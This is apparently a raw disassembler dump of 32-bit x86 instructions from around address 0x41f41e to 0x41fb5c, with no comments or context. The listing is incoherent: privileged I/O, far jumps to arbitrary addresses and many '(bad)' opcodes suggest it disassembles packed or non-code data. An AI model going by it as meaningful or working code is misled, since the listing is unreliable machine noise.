  41f41e:	jmp    DWORD PTR [edi-0x37e8ce9f]
  41f424:	stos   BYTE PTR es:[edi],al
  41f425:	push   esi
  41f426:	imul   esi,DWORD PTR [eax+eax*4-0x30880f0f],0x7bc344fa
  41f431:	sahf   
  41f432:	inc    esp
  41f433:	xor    eax,0x6a18b3b
  41f438:	xor    DWORD PTR [ebx+edx*1],ecx
  41f43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f43c:	xchg   edx,eax
  41f43d:	adc    al,0x60
  41f43f:	or     edx,DWORD PTR [ebp+ebp*8+0x5274819d]
  41f446:	sub    al,0xeb
  41f448:	or     ah,BYTE PTR [ebx-0x4d246232]
  41f44e:	aaa    
  41f44f:	jge    0x41f49c
  41f451:	jns    0x41f4c7
  41f453:	pop    ebx
  41f454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f455:	jg     0x41f3f1
  41f457:	xchg   edi,eax
  41f458:	das    
  41f459:	add    eax,0x8a066418
  41f45e:	ret    0x395c
  41f461:	les    edi,FWORD PTR [ebx-0x75a649f7]
  41f467:	daa    
  41f468:	xchg   edi,eax
  41f469:	pop    ecx
  41f46a:	push   ecx
  41f46b:	xchg   ebx,eax
  41f46c:	addr16 inc ebp
  41f46e:	in     al,dx
  41f46f:	aam    0xd4
  41f471:	int    0x6e
  41f473:	fnstcw WORD PTR [ecx+ecx*4]
  41f476:	fs jmp 0x41f40a
  41f479:	clc    
  41f47a:	lea    ebp,[edi]
  41f47c:	push   0xa
  41f47e:	jle    0x41f474
  41f480:	(bad)  [ebx+0x22]
  41f483:	dec    ecx
  41f484:	sbb    eax,0xbf6e3e1b
  41f489:	adc    al,BYTE PTR [esp+ebp*8]
  41f48c:	stos   DWORD PTR es:[edi],eax
  41f48d:	test   DWORD PTR [ebx],eax
  41f48f:	and    ch,BYTE PTR [eax-0xeeaf9d4]
  41f495:	jbe    0x41f4aa
  41f497:	shr    DWORD PTR ds:0xc5ddd9ae,1
  41f49d:	lods   eax,DWORD PTR ds:[esi]
  41f49e:	adc    al,BYTE PTR [edi-0x472c868f]
  41f4a4:	xchg   DWORD PTR fs:[edx],esi
  41f4a7:	in     eax,dx
  41f4a8:	jns    0x41f50e
  41f4aa:	icebp  
  41f4ab:	xlat   BYTE PTR ds:[ebx]
  41f4ac:	jp     0x41f48c
  41f4ae:	fistp  DWORD PTR [eax-0xf]
  41f4b1:	dec    eax
  41f4b2:	jecxz  0x41f495
  41f4b4:	push   cs
  41f4b5:	sbb    ch,BYTE PTR [eax]
  41f4b7:	jp     0x41f4a6
  41f4b9:	jne    0x41f519
  41f4bb:	inc    ebp
  41f4bc:	(bad)  
  41f4bd:	enter  0xf2d8,0x3e
  41f4c1:	dec    eax
  41f4c2:	enter  0x4bca,0x2a
  41f4c6:	jmp    0x24ad4c77
  41f4cb:	push   cs
  41f4cc:	mov    al,BYTE PTR [ecx]
  41f4ce:	hlt    
  41f4cf:	bound  edi,QWORD PTR [esi]
  41f4d1:	and    ebx,DWORD PTR [ecx-0x53]
  41f4d4:	shr    BYTE PTR [edi],1
  41f4d6:	lods   al,BYTE PTR ds:[esi]
  41f4d7:	jbe    0x41f4c2
  41f4d9:	ins    DWORD PTR es:[edi],dx
  41f4da:	out    dx,al
  41f4db:	adc    BYTE PTR [edx-0xe312ff],0xf2
  41f4e2:	sbb    al,0xc8
  41f4e4:	lock test BYTE PTR [eax-0x5a],al
  41f4e8:	std    
  41f4e9:	sbb    edi,0x6bcfdfb
  41f4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f0:	test   DWORD PTR [ebx],esi
  41f4f2:	and    DWORD PTR [ebp-0x7ba20067],0xffffff93
  41f4f9:	sti    
  41f4fa:	rol    DWORD PTR [edi+0x74],cl
  41f4fd:	mov    ebp,0xbfdb20dd
  41f502:	sub    al,0x3f
  41f504:	mov    ds:0xeeba37c2,al
  41f509:	mov    bh,0x78
  41f50b:	sbb    eax,0xf557bf
  41f510:	jg     0x41f590
  41f512:	mov    ebp,0x97ece7f9
  41f517:	or     BYTE PTR [eax+0x40],bh
  41f51a:	les    eax,FWORD PTR [ecx+0x12c873a4]
  41f520:	rcr    DWORD PTR [ebp-0x28d87a3],0x42
  41f527:	dec    ebx
  41f528:	imul   edx,DWORD PTR [ebx],0x2f
  41f52b:	dec    ebx
  41f52c:	lds    edx,FWORD PTR [eax-0x3d5b4843]
  41f532:	stos   BYTE PTR es:[edi],al
  41f533:	mov    eax,0x33f76062
  41f538:	xchg   edx,eax
  41f539:	rcr    DWORD PTR [esi-0x43e37dc5],1
  41f53f:	jecxz  0x41f53d
  41f541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f542:	xor    ecx,DWORD PTR [ebx-0x28cd374a]
  41f548:	in     eax,dx
  41f549:	xchg   edx,eax
  41f54a:	push   ebp
  41f54b:	mov    DWORD PTR [edi],0x7018530a
  41f551:	ret    
  41f552:	dec    edx
  41f553:	pop    edx
  41f554:	and    DWORD PTR [ecx],0x18
  41f557:	inc    edi
  41f558:	cli    
  41f559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f55a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41f55c:	xchg   esp,eax
  41f55d:	gs xchg ebx,eax
  41f55f:	mov    ebx,DWORD PTR [eax-0x4182a957]
  41f565:	jmp    0x36f1:0x2d514643
  41f56c:	pop    ebp
  41f56d:	push   ss
  41f56e:	sbb    BYTE PTR ds:0x3b4f4d9e,ch
  41f575:	les    esi,FWORD PTR [ecx]
  41f577:	mov    ecx,0xc19d6448
  41f57c:	in     al,dx
  41f57d:	mov    ebx,edi
  41f57f:	sahf   
  41f580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f581:	and    ah,bh
  41f583:	shr    BYTE PTR [di-0x72],0xe9
  41f588:	jo     0x41f5e3
  41f58a:	mov    esp,0x23b69b2b
  41f58f:	nop
  41f590:	pop    es
  41f591:	scas   al,BYTE PTR es:[edi]
  41f592:	ins    BYTE PTR es:[edi],dx
  41f593:	bound  ebx,QWORD PTR [eax]
  41f595:	iret   
  41f596:	inc    BYTE PTR [edi-0x3b]
  41f599:	mov    ah,BYTE PTR [ebp-0x605c9187]
  41f59f:	outs   dx,DWORD PTR ds:[esi]
  41f5a0:	lea    esp,[edx+ebp*1+0x72]
  41f5a4:	push   ebx
  41f5a5:	and    dl,al
  41f5a7:	cli    
  41f5a8:	cld    
  41f5a9:	dec    ebp
  41f5aa:	lods   eax,DWORD PTR ds:[esi]
  41f5ab:	inc    edx
  41f5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5ad:	xchg   edx,eax
  41f5ae:	xchg   ecx,eax
  41f5af:	xchg   ebp,eax
  41f5b0:	sar    dh,cl
  41f5b2:	cmp    al,0x1d
  41f5b4:	int    0xea
  41f5b6:	adc    ax,0xe665
  41f5ba:	rcl    DWORD PTR ds:0x8e7d2e3e,1
  41f5c0:	fist   DWORD PTR [ecx-0x267c6d69]
  41f5c6:	mov    edx,0xe7d3eb8b
  41f5cb:	sahf   
  41f5cc:	and    BYTE PTR [edi+0x1546124e],ah
  41f5d2:	mov    eax,ds:0x7b70acb4
  41f5d7:	cmp    al,0x59
  41f5d9:	xchg   esi,eax
  41f5da:	push   esi
  41f5db:	mov    bh,BYTE PTR [ebp-0x3cca430c]
  41f5e1:	shl    ah,1
  41f5e3:	pop    esi
  41f5e4:	jnp    0x41f5f4
  41f5e6:	sbb    edi,DWORD PTR ds:0x8aaec8d4
  41f5ec:	bound  esp,QWORD PTR [ebx+0x4d]
  41f5ef:	int3   
  41f5f0:	ja     0x41f5c9
  41f5f2:	enter  0xf030,0x1d
  41f5f6:	enter  0x5e69,0xc2
  41f5fa:	adc    BYTE PTR [ebp-0x68270e36],ah
  41f600:	outs   dx,BYTE PTR ds:[esi]
  41f601:	outs   dx,DWORD PTR ds:[esi]
  41f602:	sub    ah,BYTE PTR [ecx+eax*8-0x20]
  41f606:	or     edi,ebx
  41f608:	pushf  
  41f609:	sbb    BYTE PTR [ebp-0x63],bl
  41f60c:	das    
  41f60d:	mov    cl,0x3f
  41f60f:	jg     0x41f63f
  41f611:	push   eax
  41f612:	xor    BYTE PTR [ebx-0x1d],dh
  41f615:	(bad)  
  41f616:	mov    BYTE PTR [esp+ebx*2-0x41],al
  41f61a:	fsub   QWORD PTR [eax]
  41f61c:	jnp    0x41f686
  41f61e:	mov    ds,WORD PTR [edx-0x5a8e7a16]
  41f624:	adc    al,0xa4
  41f626:	mov    DWORD PTR [ecx-0x5765abcc],edx
  41f62c:	xor    ebx,DWORD PTR gs:[esi]
  41f62f:	adc    DWORD PTR [edi+esi*4-0x71efa142],ecx
  41f636:	cmp    ecx,DWORD PTR [ebx]
  41f638:	sub    esp,ebx
  41f63a:	fadd   QWORD PTR [esi]
  41f63c:	mov    esp,0xe6e9affd
  41f641:	adc    ah,BYTE PTR [ecx+esi*2+0x53]
  41f645:	push   edi
  41f646:	(bad)  
  41f647:	out    dx,al
  41f648:	adc    eax,0x928d499e
  41f64d:	mov    DWORD PTR [eax-0x103f1723],ebp
  41f653:	xchg   esi,eax
  41f654:	arpl   WORD PTR [ebx],bx
  41f656:	iret   
  41f657:	mov    ds:0xfadd6389,al
  41f65c:	in     eax,dx
  41f65d:	call   0xcd2451c9
  41f662:	push   edi
  41f663:	jl     0x41f644
  41f665:	icebp  
  41f666:	xchg   edx,eax
  41f667:	repnz xchg edx,eax
  41f669:	xor    DWORD PTR [ecx+0x3b],edx
  41f66c:	inc    edx
  41f66d:	push   ebp
  41f66e:	push   ecx
  41f66f:	mov    eax,0x82e964d7
  41f674:	daa    
  41f675:	push   es
  41f676:	(bad)  
  41f677:	shl    BYTE PTR [edx],0x34
  41f67a:	dec    eax
  41f67b:	mov    ebp,0xb874656d
  41f680:	js     0x41f6eb
  41f682:	pop    edi
  41f683:	and    al,0xc4
  41f685:	dec    eax
  41f686:	xchg   ebx,ecx
  41f688:	enter  0x2ade,0xa9
  41f68c:	and    esp,ebx
  41f68e:	(bad)  
  41f690:	aas    
  41f691:	je     0x41f6ff
  41f693:	cmp    al,0xf7
  41f695:	push   ds
  41f696:	es fwait
  41f698:	aas    
  41f699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f69a:	inc    ecx
  41f69b:	sub    al,0xdf
  41f69e:	xor    eax,0x8d1f4826
  41f6a3:	mov    dl,0x49
  41f6a5:	mov    eax,ds:0x214647d9
  41f6aa:	dec    esp
  41f6ab:	sar    eax,cl
  41f6ad:	xchg   DWORD PTR [edi-0x27004adb],edi
  41f6b3:	add    ebp,DWORD PTR [ebp+0x77]
  41f6b6:	or     al,0xf3
  41f6b8:	dec    eax
  41f6b9:	push   ss
  41f6ba:	das    
  41f6bb:	mov    ds:0x63a8ed96,al
  41f6c0:	(bad)  
  41f6c1:	rcl    bh,1
  41f6c3:	mov    WORD PTR [edx-0x67],cs
  41f6c6:	or     BYTE PTR [edi+0xd],dh
  41f6c9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41f6cb:	or     DWORD PTR [ebp+0x4d],edi
  41f6ce:	sub    ebx,eax
  41f6d0:	jno    0x41f732
  41f6d2:	sub    BYTE PTR [edi-0x78],ah
  41f6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d6:	push   eax
  41f6d7:	xor    BYTE PTR [edx],cl
  41f6d9:	xor    BYTE PTR [ebx],ah
  41f6db:	push   esp
  41f6dc:	jle    0x41f6f2
  41f6de:	in     al,dx
  41f6df:	fst    st(7)
  41f6e1:	push   ebx
  41f6e2:	into   
  41f6e3:	xor    DWORD PTR [eax],ecx
  41f6e5:	pop    eax
  41f6e6:	pop    es
  41f6e7:	js     0x41f745
  41f6e9:	mov    ecx,0x29e0d406
  41f6ee:	jg     0x41f6d7
  41f6f0:	mov    al,0x5b
  41f6f2:	sbb    edi,0x17
  41f6f5:	xlat   BYTE PTR ds:[ebx]
  41f6f6:	in     al,0x80
  41f6f8:	jl     0x41f68e
  41f6fa:	addr16 cli 
  41f6fc:	sti    
  41f6fd:	push   0x92072e15
  41f702:	pop    eax
  41f703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f704:	leave  
  41f705:	xor    DWORD PTR [esi],0x71
  41f708:	cmp    eax,0x8b951c86
  41f70d:	cli    
  41f70e:	pusha  
  41f70f:	or     al,0x88
  41f711:	or     DWORD PTR [ebp+0x7241a1ce],0x2e8f8a86
  41f71b:	pop    eax
  41f71c:	into   
  41f71d:	xchg   edi,eax
  41f71e:	repz push ebx
  41f720:	push   0xfffffffc
  41f722:	jo     0x41f718
  41f724:	lock lds edi,FWORD PTR [ebx+0x2a]
  41f728:	push   esp
  41f729:	sub    al,0x77
  41f72b:	in     al,dx
  41f72c:	aas    
  41f72d:	cmc    
  41f72e:	cmp    ch,cl
  41f730:	mov    al,ds:0xad650f35
  41f735:	rcr    sp,cl
  41f738:	push   esp
  41f739:	shr    al,cl
  41f73b:	jne    0x41f72d
  41f73d:	or     BYTE PTR [edx-0x3de93a10],bh
  41f743:	mov    DWORD PTR [edi-0x16],esp
  41f746:	ja     0x41f73b
  41f748:	dec    edx
  41f749:	and    edx,edi
  41f74b:	into   
  41f74c:	add    esi,ebp
  41f74e:	xchg   edi,eax
  41f74f:	fbstp  TBYTE PTR [ecx]
  41f751:	popa   
  41f752:	fild   DWORD PTR ds:0x280b3b82
  41f758:	punpckldq mm3,DWORD PTR [eax-0xb]
  41f75c:	push   0x405652d9
  41f761:	pop    ebp
  41f762:	push   edx
  41f763:	pop    es
  41f764:	cs in  al,0x7d
  41f767:	sub    ebp,DWORD PTR [ecx+edx*8-0x5dd746aa]
  41f76e:	(bad)  
  41f76f:	mov    bl,0xf5
  41f771:	out    0x9b,eax
  41f773:	add    DWORD PTR [ecx],0xffffffd0
  41f776:	mov    ?,WORD PTR [ecx+0xdcb4550]
  41f77c:	cld    
  41f77d:	jecxz  0x41f7a1
  41f77f:	cmp    eax,0xf9478500
  41f784:	xchg   edx,eax
  41f785:	std    
  41f786:	jp     0x41f7ba
  41f788:	imul   edx,DWORD PTR [ebx+eiz*8-0x5352e670],0x86bb1280
  41f793:	fiadd  DWORD PTR [ecx]
  41f795:	dec    ebx
  41f796:	mov    al,ds:0x6550a4d
  41f79b:	sbb    dl,BYTE PTR [esi+0x2b4e358]
  41f7a1:	pop    edx
  41f7a2:	ficom  DWORD PTR [eax-0x1f]
  41f7a5:	(bad)  
  41f7a7:	and    edx,DWORD PTR [eax+0x46]
  41f7aa:	xchg   bl,dl
  41f7ac:	scas   eax,DWORD PTR es:[edi]
  41f7ad:	js     0x41f776
  41f7af:	sub    BYTE PTR [ebp+0x5025a817],ch
  41f7b5:	mov    al,ds:0xd5fd474f
  41f7ba:	or     eax,0x4317493b
  41f7bf:	sub    eax,0x1e4e266e
  41f7c4:	inc    edi
  41f7c5:	in     al,dx
  41f7c6:	jb     0x41f79f
  41f7c8:	aaa    
  41f7c9:	push   ecx
  41f7ca:	adc    edx,DWORD PTR [ecx+0x465a12b9]
  41f7d0:	scas   al,BYTE PTR es:[edi]
  41f7d1:	or     bh,bl
  41f7d3:	jecxz  0x41f840
  41f7d5:	mov    bh,0xe0
  41f7d7:	inc    ebp
  41f7d8:	xor    bl,BYTE PTR [edx]
  41f7da:	(bad)  
  41f7db:	jne    0x41f824
  41f7dd:	ret    0x17d0
  41f7e0:	mov    esp,0x1e686265
  41f7e5:	neg    DWORD PTR [ebx+0x34]
  41f7e8:	in     eax,0xef
  41f7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7eb:	cld    
  41f7ec:	lods   eax,DWORD PTR ds:[esi]
  41f7ed:	lahf   
  41f7ee:	inc    eax
  41f7ef:	rcr    BYTE PTR [eax+eax*8+0x3a],0xec
  41f7f4:	inc    eax
  41f7f5:	int3   
  41f7f6:	adc    al,0x5a
  41f7f8:	push   ds
  41f7f9:	pusha  
  41f7fa:	sbb    BYTE PTR [ecx-0x5b],ah
  41f7fd:	aas    
  41f7fe:	rol    edi,1
  41f800:	lods   al,BYTE PTR ds:[esi]
  41f801:	add    DWORD PTR [edi+edx*8+0x1a47addb],edi
  41f808:	xor    esi,DWORD PTR [ebx-0xf38171f]
  41f80e:	jae    0x41f7bf
  41f810:	dec    ecx
  41f811:	add    eax,0x62fc8666
  41f816:	jnp    0x41f7c1
  41f818:	mov    bh,0x7a
  41f81a:	cld    
  41f81b:	fldcw  WORD PTR [ecx+0x5f]
  41f81e:	outs   dx,DWORD PTR ds:[esi]
  41f81f:	ja     0x41f842
  41f821:	ja     0x41f888
  41f823:	mov    al,0x80
  41f825:	jle    0x41f81c
  41f827:	sub    ch,al
  41f829:	cmp    BYTE PTR [ecx-0x69420b06],al
  41f82f:	into   
  41f830:	inc    bh
  41f832:	loopne 0x41f7eb
  41f834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f835:	(bad)  
  41f836:	mov    ebx,0xed79b2eb
  41f83b:	aas    
  41f83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f83d:	dec    ebp
  41f83e:	xor    ebx,ecx
  41f840:	js     0x41f7e5
  41f842:	sub    ch,BYTE PTR [ecx-0xb550536]
  41f848:	and    ebx,DWORD PTR [esi+edi*8+0x77f169c3]
  41f84f:	xchg   edx,eax
  41f851:	xor    eax,0xe13dab06
  41f856:	or     ebx,edx
  41f858:	adc    edx,DWORD PTR [ebp+0x9]
  41f85b:	mov    cl,0xf
  41f85d:	sbb    DWORD PTR [ecx],ebp
  41f85f:	pop    ss
  41f860:	mov    ecx,eax
  41f862:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41f864:	mov    eax,0x1839a878
  41f869:	lahf   
  41f86a:	in     eax,dx
  41f86b:	and    al,0x5c
  41f86d:	ds das 
  41f86f:	mov    ds,WORD PTR [eax+0x15ad0938]
  41f875:	int    0x70
  41f877:	in     eax,dx
  41f878:	dec    edx
  41f879:	dec    edi
  41f87a:	and    DWORD PTR [eax],esp
  41f87c:	xor    eax,0x23aee381
  41f881:	std    
  41f882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f883:	ret    0x102a
  41f886:	fst    QWORD PTR [edx-0xa6c58b5]
  41f88c:	cld    
  41f88d:	inc    esi
  41f88e:	dec    eax
  41f88f:	or     cl,bh
  41f891:	pop    ss
  41f892:	cmp    ch,bl
  41f894:	push   0x35
  41f896:	mov    dh,0x72
  41f898:	inc    ebp
  41f899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f89a:	arpl   WORD PTR [edi],ax
  41f89c:	je     0x41f8c9
  41f89e:	pop    edx
  41f89f:	ds popa 
  41f8a1:	outs   dx,DWORD PTR ds:[esi]
  41f8a2:	inc    edx
  41f8a3:	ficom  DWORD PTR ds:0xd10656fd
  41f8a9:	mov    ecx,0x6f2f373
  41f8ae:	push   edx
  41f8af:	push   esi
  41f8b0:	jns    0x41f8be
  41f8b2:	mov    esi,0xcd14fb88
  41f8b7:	int    0x9f
  41f8b9:	jo     0x41f905
  41f8bb:	cmp    bh,BYTE PTR [edx-0x6d06d088]
  41f8c1:	into   
  41f8c2:	xor    al,0x53
  41f8c4:	loop   0x41f8e2
  41f8c6:	out    0xb7,al
  41f8c8:	ret    
  41f8c9:	mov    ds:0x4183f63b,al
  41f8ce:	test   BYTE PTR [eax-0x70ac2aa7],ch
  41f8d4:	out    0x11,al
  41f8d6:	lods   eax,DWORD PTR ds:[esi]
  41f8d7:	adc    eax,0xb3b6a125
  41f8dc:	pushf  
  41f8dd:	mov    dl,0x9
  41f8df:	mov    al,0xce
  41f8e1:	out    0x81,al
  41f8e3:	push   cs
  41f8e4:	pop    edi
  41f8e5:	xor    eax,0x55d8778e
  41f8ea:	add    al,0x86
  41f8ec:	or     BYTE PTR [esi+0x209008fa],0x21
  41f8f3:	jbe    0x41f8e0
  41f8f5:	xchg   edi,eax
  41f8f6:	pushf  
  41f8f7:	dec    ebx
  41f8f8:	push   cs
  41f8f9:	test   DWORD PTR [edi+0x41bf59f7],eax
  41f8ff:	enter  0xa00b,0xca
  41f903:	rcl    BYTE PTR [edx+edi*1-0x58],0xc9
  41f908:	pop    ds
  41f909:	mov    ebx,0x4cc90e9e
  41f90e:	mov    dh,0xd7
  41f910:	mov    bl,0x78
  41f912:	stos   BYTE PTR es:[edi],al
  41f913:	cmp    eax,0x2b5adeed
  41f918:	xchg   esp,eax
  41f919:	adc    esi,DWORD PTR [edx]
  41f91b:	mov    dl,0x9e
  41f91d:	nop
  41f91e:	shr    esi,cl
  41f920:	and    dl,bh
  41f922:	data16 lahf 
  41f924:	sbb    bh,0xff
  41f927:	es jmp 0x41f933
  41f92a:	daa    
  41f92b:	sub    esp,DWORD PTR [edi]
  41f92d:	cli    
  41f92e:	fldcw  WORD PTR [ebp+0x1b]
  41f931:	out    0x28,al
  41f933:	loope  0x41f91a
  41f935:	icebp  
  41f936:	jo     0x41f993
  41f938:	mov    edi,0x7b295fbd
  41f93d:	out    0x77,al
  41f93f:	in     al,0x12
  41f941:	mov    ah,0x15
  41f943:	outs   dx,DWORD PTR ds:[esi]
  41f944:	rcl    BYTE PTR [esi],0x55
  41f947:	or     DWORD PTR [esi+0x4b],0xffffff81
  41f94b:	test   eax,0x8f0cb120
  41f950:	das    
  41f951:	add    al,0x84
  41f953:	aaa    
  41f954:	or     eax,0x887beabf
  41f959:	test   al,0x35
  41f95b:	cmp    BYTE PTR [ebx-0x6fbb8608],0xd9
  41f962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f963:	icebp  
  41f964:	pop    ecx
  41f965:	jo     0x41f943
  41f967:	out    dx,al
  41f968:	mov    ds:0xadf1dd8a,eax
  41f96d:	lods   eax,DWORD PTR ds:[esi]
  41f96e:	(bad)
  41f971:	cmp    dl,cl
  41f973:	inc    ecx
  41f974:	add    eax,0x153e11c1
  41f979:	jae    0x41f9bd
  41f97b:	test   ch,dh
  41f97d:	call   0x81ce5c92
  41f982:	leave  
  41f983:	mov    ah,0xe3
  41f985:	xchg   ecx,eax
  41f986:	bound  esp,QWORD PTR [eax]
  41f988:	push   esi
  41f989:	icebp  
  41f98a:	or     eax,0x50a6cbd3
  41f98f:	cmp    DWORD PTR [ecx],eax
  41f991:	arpl   WORD PTR [esi],si
  41f993:	xchg   ebx,eax
  41f994:	in     al,0x82
  41f996:	sbb    BYTE PTR [esi-0x7a],cl
  41f999:	xchg   ebx,eax
  41f99a:	lahf   
  41f99b:	pop    edx
  41f99c:	adc    ah,BYTE PTR [ecx]
  41f99e:	hlt    
  41f99f:	push   esi
  41f9a0:	sti    
  41f9a1:	xchg   edi,eax
  41f9a2:	std    
  41f9a3:	stc    
  41f9a4:	leavew 
  41f9a6:	pop    es
  41f9a7:	mov    eax,0x856bae81
  41f9ac:	out    0xcb,al
  41f9ae:	mov    esp,0x58b349b9
  41f9b3:	mov    BYTE PTR [ebp-0x1cf0cd17],cl
  41f9b9:	ss sbb al,0xec
  41f9bc:	jmp    0xe45045c2
  41f9c1:	inc    eax
  41f9c2:	leave  
  41f9c3:	xchg   esp,eax
  41f9c4:	mov    ebx,0xc5584a41
  41f9c9:	sti    
  41f9ca:	dec    edi
  41f9cb:	(bad)  
  41f9cc:	div    ah
  41f9ce:	fdivr  DWORD PTR [edx+0x24]
  41f9d1:	add    ebx,DWORD PTR [ebx+0x41]
  41f9d4:	(bad)  
  41f9d5:	loopne 0x41fa0b
  41f9d7:	call   0xe70c:0x38e6a523
  41f9de:	pop    es
  41f9df:	sbb    BYTE PTR [edi],al
  41f9e1:	gs call 0x52d6:0x344539d8
  41f9e9:	adc    BYTE PTR [ebp+edx*2-0xc47055e],dh
  41f9f0:	adc    DWORD PTR [edx-0x4f],0xffffffcd
  41f9f4:	dec    edi
  41f9f5:	inc    edx
  41f9f6:	mov    gs,WORD PTR [esi+0x16]
  41f9f9:	ins    DWORD PTR es:[edi],dx
  41f9fa:	jge    0x41fa3c
  41f9fc:	ss dec esp
  41f9fe:	rol    DWORD PTR [esi+0x519a0ada],0x70
  41fa05:	ret    0x4bdd
  41fa08:	mov    al,ds:0x6e055d2c
  41fa0d:	call   0x7a884311
  41fa12:	pop    edx
  41fa13:	or     BYTE PTR [ebx],0x77
  41fa16:	cdq    
  41fa17:	mov    ecx,0x6975d4cd
  41fa1c:	pop    esi
  41fa1d:	mov    cl,0x88
  41fa1f:	push   0x7e64caee
  41fa24:	scas   eax,DWORD PTR es:[edi]
  41fa25:	dec    esp
  41fa26:	in     al,0x31
  41fa28:	in     al,0xf2
  41fa2a:	mov    DWORD PTR [eax-0x50],esp
  41fa2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa2e:	call   0xa28eed0
  41fa33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa34:	rcl    eax,cl
  41fa36:	xor    esi,0xffffffc6
  41fa39:	adc    eax,0xe5ff8f2a
  41fa3e:	sahf   
  41fa3f:	cs das 
  41fa41:	scas   eax,DWORD PTR es:[edi]
  41fa42:	lods   eax,DWORD PTR ds:[esi]
  41fa43:	das    
  41fa44:	out    dx,eax
  41fa45:	repz in al,dx
  41fa47:	cdq    
  41fa48:	int    0x4c
  41fa4a:	(bad)  
  41fa4b:	jmp    0x145c:0xa661aaac
  41fa52:	or     eax,0xb3c0e274
  41fa57:	cmp    dl,dl
  41fa59:	pop    edx
  41fa5a:	aam    0x7c
  41fa5c:	dec    edx
  41fa5d:	daa    
  41fa5e:	and    eax,0xa4979c90
  41fa63:	sbb    al,0x6b
  41fa65:	bound  ebp,QWORD PTR [eax-0x501474ad]
  41fa6b:	add    BYTE PTR [ebp+0x28],al
  41fa6e:	jne    0x41fa43
  41fa70:	fld    QWORD PTR [ebx-0x570c1625]
  41fa76:	rcl    BYTE PTR [eax-0x7881524],1
  41fa7c:	stc    
  41fa7d:	inc    ecx
  41fa7e:	pop    edi
  41fa7f:	mov    al,0x9a
  41fa81:	xchg   esi,eax
  41fa82:	add    bp,WORD PTR [esi-0x6eb933cd]
  41fa89:	cmp    BYTE PTR [ebp+0xbc34439],0x5e
  41fa90:	xchg   esi,eax
  41fa91:	and    DWORD PTR [edx],0x7954ad0a
  41fa97:	adc    eax,0x15b8d4da
  41fa9c:	imul   DWORD PTR [ebx-0x69]
  41fa9f:	inc    eax
  41faa0:	xchg   edi,eax
  41faa1:	adc    DWORD PTR [ecx],esi
  41faa3:	test   bh,ah
  41faa5:	lods   eax,DWORD PTR ds:[esi]
  41faa6:	test   BYTE PTR [ebx],dh
  41faa8:	mov    ah,0xee
  41faaa:	mov    ebp,0x3e3815c8
  41faaf:	pop    esi
  41fab0:	and    ah,BYTE PTR [ecx+0x3c]
  41fab3:	mov    ecx,0xfac6d00d
  41fab8:	fisub  WORD PTR [esi]
  41faba:	pop    ebp
  41fabb:	and    eax,0xc15ae0cc
  41fac0:	sub    al,0x8a
  41fac2:	aas    
  41fac3:	push   eax
  41fac4:	add    al,0x64
  41fac6:	loop   0x41fadf
  41fac8:	fdivr  DWORD PTR [ecx-0x47]
  41facb:	popa   
  41facc:	out    0x3,eax
  41face:	test   DWORD PTR [eax-0x57],ebx
  41fad1:	pusha  
  41fad2:	in     eax,0x92
  41fad4:	fwait
  41fad5:	cmp    bh,dl
  41fad7:	xor    ch,ch
  41fad9:	fwait
  41fada:	sbb    BYTE PTR [edi-0x2c],cl
  41fadd:	adc    bl,BYTE PTR [eax-0xe0c199c]
  41fae3:	xchg   DWORD PTR [edx+0x5d1398a6],eax
  41fae9:	pop    esp
  41faea:	dec    edx
  41faeb:	mov    ds:0xbbf1bdab,al
  41faf0:	jb     0x41fb40
  41faf2:	sub    eax,0xe60cb2ad
  41faf7:	add    bh,BYTE PTR [ebp-0x457d777e]
  41fafd:	test   DWORD PTR [ecx],edx
  41faff:	sti    
  41fb00:	inc    ebx
  41fb01:	xchg   BYTE PTR [esp+ebx*2-0x35],bh
  41fb05:	push   edx
  41fb06:	sub    al,0xf5
  41fb08:	adc    DWORD PTR ds:0x62ace268,edi
  41fb0e:	mov    eax,0x3a9ad56a
  41fb13:	jmp    0x8f4239fb
  41fb18:	mov    esp,0xca1dcd6f
  41fb1d:	xchg   ebp,eax
  41fb1f:	repnz cmp DWORD PTR gs:[esi+0x27],ecx
  41fb24:	out    dx,eax
  41fb25:	ret    0x4603
  41fb28:	int3   
  41fb29:	cmp    edx,DWORD PTR [eax+0x29]
  41fb2c:	fldenv [ecx-0x6a]
  41fb2f:	dec    esi
  41fb30:	mov    ch,0x77
  41fb32:	mov    al,0xd7
  41fb34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb35:	(bad)  
  41fb36:	fcmovne st,st(3)
  41fb38:	inc    esp
  41fb39:	cwde   
  41fb3a:	enter  0xc8db,0xa6
  41fb3e:	xchg   DWORD PTR [edi-0xd0a4184],eax
  41fb44:	shr    esi,cl
  41fb46:	inc    eax
  41fb47:	cmp    BYTE PTR gs:[ecx-0x8],bl
  41fb4b:	dec    edx
  41fb4c:	sbb    eax,0x4de505d
  41fb51:	lods   eax,DWORD PTR ds:[esi]
  41fb52:	into   
  41fb53:	outs   dx,DWORD PTR ds:[esi]
  41fb54:	mov    DWORD PTR [ebx-0x5],edx
  41fb57:	les    eax,FWORD PTR [eax]
  41fb59:	daa    
  41fb5a:	ins    BYTE PTR es:[edi],dx
  41fb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb5c:	mov    ds:0x914e9dd7,eax
